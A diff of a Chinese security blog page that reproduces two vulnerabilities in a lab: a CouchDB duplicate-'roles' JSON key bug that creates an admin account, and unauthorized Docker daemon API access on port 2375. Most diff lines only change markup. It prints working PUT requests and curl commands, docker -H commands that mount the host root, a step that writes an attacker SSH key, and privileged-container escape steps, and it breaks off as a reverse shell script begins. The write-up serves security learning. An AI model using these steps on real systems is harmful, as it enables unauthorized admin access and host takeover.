+{[{&lt;&lt;"foo"&gt;&gt;,&lt;&lt;"bar"&gt;&gt;},{&lt;&lt;"foo"&gt;&gt;,&lt;&lt;"baz"&gt;&gt;}]}</code></pre>
 <p>JavaScript：</p>
-<pre class="line-numbers language-json" data-language="json"><code class="language-json">&gt; JSON.parse(<span class="token string">"{\"foo\":\"bar\", \"foo\": \"baz\"}"</span>)
-<span class="token punctuation">{</span>foo<span class="token operator">:</span> <span class="token string">"baz"</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs json">&gt; JSON.parse(<span class="hljs-string">"{\"foo\":\"bar\", \"foo\": \"baz\"}"</span>)
+<span class="hljs-punctuation">{</span>foo<span class="hljs-punctuation">:</span> <span class="hljs-string">"baz"</span><span class="hljs-punctuation">}</span></code></pre>
 <p>对于给定的键，Erlang 解析器将存储这两个值，但 Javascript 解析器将仅存储最后一个值。不幸的是，CouchDB 数据内部表示的 get_value 函数只会返回<em>第一个</em>值：</p>
-<pre class="line-numbers language-none"><code class="language-none">% Within couch_util:get_value 
+<pre><code class="hljs plaintext">% Within couch_util:get_value 
 lists:keysearch(Key, 1, List).
  
  
 % keysearch(Key, N, TupleList) -&gt; {value, Tuple} | false
 % Searches the list of tuples TupleList for a tuple whose Nth element compares equal to Key. Returns {value, Tuple} if such a tuple is found, otherwise false.
 
-//在元组TupleList列表中搜索其第n个元素比较等于Key的元组。如果找到这样的元组，则返回{value, Tuple}，否则返回false。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+//在元组TupleList列表中搜索其第n个元素比较等于Key的元组。如果找到这样的元组，则返回{value, Tuple}，否则返回false。</code></pre>
 <p>因此，我们可以绕过所有相关的输入验证并创建一个管理员用户：</p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http">curl -X PUT 'http://your-ip:5984/_users/org.couchdb.user:oops'
+<pre><code class="hljs http">curl -X PUT 'http://your-ip:5984/_users/org.couchdb.user:oops'
 --data-binary '{
   "type": "user",
   "name": "oops",
   "roles": ["_admin"],
   "roles": [],
   "password": "password"
-}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+}'</code></pre>
 <p>js解析只存储第二个值，roles为空，权限放行；但Eralang解析器将解析并存储两个值，但是在CouchDB中get_value函数只返回了jiffy所解析到的第一个键的值，即admin，管理员权限。</p>
 <p>注：通过查看源码，权限判断中，只要roles长度大于0就返回forbidden，只有管理员才能进行修改。</p>
 <p>所以此POC成功绕过js的检查，并成功被erlang解析为管理员账户。</p>
@@ -625,51 +338,51 @@ lists:keysearch(Key, 1, List).
 <p>JavaScript在检测时，检测我们创建的用户“角色＝０”。无角色，也就不存在权限，所以没有危害，系统判定为安全，绕过了检测。接下来在CouchDB的Erlang部分实现身份验证和授权时，jiffy实现的时候，getter函数只返回第一个值也就是"roles": [“_admin”],所以创建出了具有admin权限的账户。</p>
 <p><strong>开始复现</strong></p>
 <p>访问首页发现是json数据</p>
-<p><img src="image-20230708170804110.png" alt="image-20230708170804110"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708170804110.png" alt="image-20230708170804110"></p>
 <p>接下来访问<a target="_blank" rel="noopener" href="http://127.0.0.1:5984/_utils/">http://127.0.0.1:5984/_utils/</a> 发现</p>
-<p><img src="image-20230708171343041.png" alt="image-20230708171343041"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708171343041.png" alt="image-20230708171343041"></p>
 <p>点击验证数据库正确性，发现我们不是管理员无权操作，这样的话我们尝试直接创建一个管理员用户</p>
-<p><img src="image-20230708171638073.png" alt="image-20230708171638073"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708171638073.png" alt="image-20230708171638073"></p>
 <p>接下来用的是网上的poc：用put发送一个请求创建管理员的数据包</p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url">/_users/org.couchdb.user:hybcx</span> <span class="token http-version property">HTTP/1.1</span></span>
-<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">124.220.233.26:5984</span></span>
-<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
-<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span>
-<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span>
-<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
-<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
-<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">108</span></span>
-<span class="token application-json">
-<span class="token punctuation">{</span>
-<span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span>
-<span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"hybcx"</span><span class="token punctuation">,</span>
-<span class="token property">"roles"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"_admin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-<span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"hybcx"</span>
-<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:hybcx</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.220.233.26:5984
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108
+
+<span class="language-prolog">{</span>
+<span class="language-prolog"><span class="hljs-string">"type"</span>: <span class="hljs-string">"user"</span>,</span>
+<span class="language-prolog"><span class="hljs-string">"name"</span>: <span class="hljs-string">"hybcx"</span>,</span>
+<span class="language-prolog"><span class="hljs-string">"roles"</span>: [<span class="hljs-string">"_admin"</span>],</span>
+<span class="language-prolog"><span class="hljs-string">"password"</span>: <span class="hljs-string">"hybcx"</span></span>
+<span class="language-prolog">}</span></code></pre>
 <p>先用bp抓个包，其实抓不抓都无所谓，我们也可以在终端上通过curl发送put数据包</p>
-<p><img src="image-20230708172042668.png" alt="image-20230708172042668"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708172042668.png" alt="image-20230708172042668"></p>
 <p>接下来在bp上，输入上述poc，如下图发现我们不是管理员，无权创建管理员账户</p>
-<p><img src="image-20230708172514410.png" alt="image-20230708172514410"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708172514410.png" alt="image-20230708172514410"></p>
 <p>但发送包含两个roles的数据包，即可绕过限制，创建一个管理员账户，这里创建了一个账户密码皆为hybcx的管理员账户，发送如下poc</p>
-<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url">/_users/org.couchdb.user:hybcx</span> <span class="token http-version property">HTTP/1.1</span></span>
-<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">124.220.233.26:5984</span></span>
-<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
-<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">en</span></span>
-<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span></span>
-<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
-<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
-<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">108</span></span>
-<span class="token application-json">
-<span class="token punctuation">{</span>
-<span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"user"</span><span class="token punctuation">,</span>
-<span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"hybcx"</span><span class="token punctuation">,</span>
-<span class="token property">"roles"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"_admin"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-<span class="token property">"roles"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
-<span class="token property">"password"</span><span class="token operator">:</span> <span class="token string">"hybcx"</span>
-<span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="image-20230708172612714.png" alt="image-20230708172612714"></p>
+<pre><code class="hljs http"><span class="hljs-keyword">PUT</span> <span class="hljs-string">/_users/org.couchdb.user:hybcx</span> <span class="hljs-meta">HTTP/1.1</span>
+<span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>124.220.233.26:5984
+<span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*
+<span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en
+<span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+<span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close
+<span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json
+<span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>108
+
+<span class="language-prolog">{</span>
+<span class="language-prolog"><span class="hljs-string">"type"</span>: <span class="hljs-string">"user"</span>,</span>
+<span class="language-prolog"><span class="hljs-string">"name"</span>: <span class="hljs-string">"hybcx"</span>,</span>
+<span class="language-prolog"><span class="hljs-string">"roles"</span>: [<span class="hljs-string">"_admin"</span>],</span>
+<span class="language-prolog"><span class="hljs-string">"roles"</span>: [],</span>
+<span class="language-prolog"><span class="hljs-string">"password"</span>: <span class="hljs-string">"hybcx"</span></span>
+<span class="language-prolog">}</span></code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708172612714.png" alt="image-20230708172612714"></p>
 <p>可以看到我们成功创建，登录验证一下</p>
-<p><img src="image-20230708172643840.png" alt="image-20230708172643840"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708172643840.png" alt="image-20230708172643840"></p>
 <p>也是成功登陆</p>
 <p><strong>漏洞修复</strong></p>
 <p><strong>patch</strong>：加入了dedupe_keys字段用于对重复键的标识，重写了make_object方法，使得jiffy解析JSON的方法和JavaScript一致。</p>
@@ -687,7 +400,7 @@ lists:keysearch(Key, 1, List).
 <p>再利用 getAttribute(“userid”) 获取其userid</p>
 <p>检查userid是否存在于LoginList中，不存在则直接返回错误跳转</p>
 <p>值得注意的是切勿将错误跳转写到Javascript里面，还返回目标URL页面的相关信息</p>
-<h5 id="Docker-daemon-api未授权访问漏洞">Docker daemon api未授权访问漏洞</h5>
+<h5 id="docker-daemon-api未授权访问漏洞">Docker daemon api未授权访问漏洞</h5>
 <p><strong>漏洞简介</strong></p>
 <p>Docker Daemon把服务暴露在tcp的2375端口上，这样就可以在网络上操作Docker了。Docker本身没有身份认证的功能，只要网络上能访问到服务端口，就可以操作Docker。与上面的<code>docker.sock</code>文件利用类似。</p>
 <p>简单来说：该未授权访问漏洞是因为Docker API可以执行Docker命令，该接口是目的是取代Docker命令界面，通过URL操作Docker。</p>
@@ -696,22 +409,22 @@ lists:keysearch(Key, 1, List).
 首先虚拟机创建一台linux（centos7版本）<br>
 机器正常安装好docker<br>
 接着进行文件备份（一下均是以root身份操作）</p>
-<pre class="line-numbers language-none"><code class="language-none">cp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">cp /lib/systemd/system/docker.service /lib/systemd/system/docker.service.bak</code></pre>
 <p>接着编辑</p>
-<pre class="line-numbers language-none"><code class="language-none">vim /lib/systemd/system/docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">vim /lib/systemd/system/docker.service</code></pre>
 <p>把下面一段代码加入文件结尾</p>
-<pre class="line-numbers language-none"><code class="language-none">[Service]
+<pre><code class="hljs plaintext">[Service]
 ExecStart=
-ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="image-20230708180359320.png" alt="image-20230708180359320"></p>
+ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375 -H unix:///var/run/docker.sock</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708180359320.png" alt="image-20230708180359320"></p>
 <p>保存并退出编辑后，重载守护进程以及重启Docker：</p>
-<pre class="line-numbers language-none"><code class="language-none">systemctl daemon-reload`
-service docker restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre><code class="hljs plaintext">systemctl daemon-reload`
+service docker restart</code></pre>
 <p>通过执行命令查看是否开放了远程访问端口：</p>
-<pre class="line-numbers language-none"><code class="language-none">systemctl status docker.service<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230708180414805.png" alt="image-20230708180414805"></p>
+<pre><code class="hljs plaintext">systemctl status docker.service</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708180414805.png" alt="image-20230708180414805"></p>
 <p>如果本地搭建访问不了的话，很大原因是因为防火墙未放行2375端口，放行端口后就可以在其他机器访问到了</p>
-<pre class="line-numbers language-none"><code class="language-none">如何在防火墙开启下，放行端口以至于外部可以访问
+<pre><code class="hljs plaintext">如何在防火墙开启下，放行端口以至于外部可以访问
 
 添加
 
@@ -724,92 +437,92 @@ firewall-cmd --add-port=5005/tcp
 
 firewall-cmd --reload
 
-这些之后，端口是开启成功的，如果没有成功，重启系统试试。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+这些之后，端口是开启成功的，如果没有成功，重启系统试试。</code></pre>
 <p><strong>漏洞检测+利用</strong></p>
 <p>访问192.168.4.92:2375/version，若能访问，证明存在未授权访问漏洞。</p>
-<p><img src="image-20230708181507793.png" alt="image-20230708181507793"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708181507793.png" alt="image-20230708181507793"></p>
 <p>目标机：192.168.4.92<br>
 攻击机：124.220.233.26</p>
 <p><strong>写入密钥免密登陆</strong></p>
 <p>在已经安装docker的vps上，使用-H参数连接目标主机的docker，使用images命令查询目标系统存在的镜像。</p>
-<p><img src="image-20230708185646585.png" alt="image-20230708185646585"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708185646585.png" alt="image-20230708185646585"></p>
 <p>使用docker命令创建一个容器，并将宿主机的磁盘挂载到容器中</p>
 <p>docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt a98b9e39cc6d /bin/bash</p>
 <p>a98b9e39cc6d 是镜像的ID<br>
 这条命令的意思是启动一个image ID 为a98b9e39cc6d的容器，并且将该宿主机的根目录挂在到容器的/mnt目录下</p>
-<p><img src="image-20230708185821418.png" alt="image-20230708185821418"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708185821418.png" alt="image-20230708185821418"></p>
 <p>如果目标机器上没有镜像就需要先pull一个镜像到目标机上。</p>
-<pre class="line-numbers language-none"><code class="language-none">docker -H tcp://192.168.4.92:2375 pull busybox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 pull busybox</code></pre>
 <p>这个镜像很小，方便下载。</p>
-<p><img src="image-20230708185915206.png" alt="image-20230708185915206"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708185915206.png" alt="image-20230708185915206"></p>
 <p>有镜像之后就很方便利用了。</p>
-<pre class="line-numbers language-none"><code class="language-none">docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 /bin/bash
+<pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 /bin/bash
 
 docker -H tcp://192.168.4.92:2375 run -it --privileged busybox  bin/sh
 //换成sh的原因可能是，我这里用的finalshell的ssh连接的目标机
-docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+docker -H tcp://192.168.4.92:2375 run -it -v /:/mnt 5242710cbd55 sh</code></pre>
 <p>启动之后就会获得该容器宿主机的shell</p>
-<p><img src="image-20230708190031855.png" alt="image-20230708190031855"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708190031855.png" alt="image-20230708190031855"></p>
 <p>因为我们把主机的根目录挂在到了这个容器的/mnt容器下，所以我们可以直接往主机的/root/.ssh目录下写authorized_keys</p>
 <p>我们将攻击机的公钥写入authorized_keys</p>
-<p><img src="image-20230708192011727.png" alt="image-20230708192011727"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708192011727.png" alt="image-20230708192011727"></p>
 <p>这里我之前目标机与kali都没有公钥，产生公钥可以参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_57414752/article/details/126369367?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168881425016800182134932%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=168881425016800182134932&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-5-126369367-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&amp;utm_term=authorized_keys%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90&amp;spm=1018.2226.3001.4187">Linux实现ssh免密</a></p>
 <p>成功免密登陆目标服务器</p>
-<pre class="line-numbers language-none"><code class="language-none">ssh root@192.168.4.92<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="image-20230708192325602.png" alt="image-20230708192325602"></p>
+<pre><code class="hljs plaintext">ssh root@192.168.4.92</code></pre>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708192325602.png" alt="image-20230708192325602"></p>
 <p><strong>写入计划任务反弹shell</strong></p>
 <p>因为docker 有远程连接命令，由于2375端口暴露，可未授权访问，所以现在可以在kali上通过远程方式连接doker</p>
 <p>前面的操作都一致<br>
 唯一不同的就是写的命令和路径<br>
 有很多种写计划任务的方法</p>
-<pre class="line-numbers language-none"><code class="language-none">docker -H tcp://192.168.4.92:2375 ps
+<pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 ps
 
-docker -H tcp://192.168.4.92:2375 images<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+docker -H tcp://192.168.4.92:2375 images</code></pre>
 <p>链接进去之后，发现没有镜像文件，那么去官方下载一个镜像文件busybox</p>
-<pre class="line-numbers language-none"><code class="language-none">docker -H tcp://192.168.241.142:2375 pull busybox<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">docker -H tcp://192.168.241.142:2375 pull busybox</code></pre>
 <p>接下来启动容器，并进入 busybox 容器</p>
-<pre class="line-numbers language-none"><code class="language-none">docker -H tcp://192.168.4.92:2375 images
+<pre><code class="hljs plaintext">docker -H tcp://192.168.4.92:2375 images
 
 docker -H tcp://192.168.4.92:2375 run -it --privileged busybox bin/sh
 
 #在kali中启动一个有交互的shell，并且是特权镜像
 
-#当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+#当操作者执行docker run —privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。</code></pre>
 <p>进入容器后，使用fdisk -l命令查看磁盘文件<br>
 <strong>注意：在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。</strong></p>
-<p><img src="image-20230708205319201.png" alt="image-20230708205319201"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708205319201.png" alt="image-20230708205319201"></p>
 <p>从返回的type信息中可以判断出，/dev/sda2是主分区，那么接下里直接在容器内部挂载宿主机磁盘</p>
-<pre class="line-numbers language-none"><code class="language-none">新建一个目录：mkdir wxiaoge
+<pre><code class="hljs plaintext">新建一个目录：mkdir wxiaoge
 
 挂载磁盘到新建目录：mount dev/sda2 wxiaoge
 
 进入目录：cd wxiaoge/
 
-新建文件：touch wxiaoge.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+新建文件：touch wxiaoge.txt</code></pre>
 <p>接下来看一下靶机中确实创建了 wxiaoge.txt 文件，docker逃逸成功</p>
-<p><img src="image-20230708205742734.png" alt="image-20230708205742734"></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230708205742734.png" alt="image-20230708205742734"></p>
 <p>接下来可以反弹主机shell<br>
 创建 <a target="_blank" rel="noopener" href="http://wxiao.sh">wxiao.sh</a> 文件</p>
-<pre class="line-numbers language-none"><code class="language-none">vi wxiaoge.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre><code class="hljs plaintext">vi wxiaoge.sh</code></pre>
 <p>写入反弹 shell</p>
-<pre class="line-numbers language-none"><code class="language-none">#!/bin/bash
+<pre><code class="hljs plaintext">#!/bin/bash
 
